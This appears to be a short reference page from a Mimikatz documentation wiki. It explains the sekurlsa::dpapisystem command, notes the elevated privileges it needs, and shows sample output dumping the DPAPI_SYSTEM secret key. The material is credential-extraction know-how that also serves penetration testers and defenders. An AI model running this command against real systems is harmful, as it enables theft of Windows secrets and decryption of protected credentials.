# dpapisystem

It lists the DPAPI\_SYSTEM secret key.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::dpapisystem
DPAPI_SYSTEM
full: c3f9c93d781ff9caa8ba1eb63018c8d869e1278fa17e7c0ff7a4f8c3be91956e1c53000494eaec52
m/u : c3f9c93d781ff9caa8ba1eb63018c8d869e1278f / a17e7c0ff7a4f8c3be91956e1c53000494eaec52
```
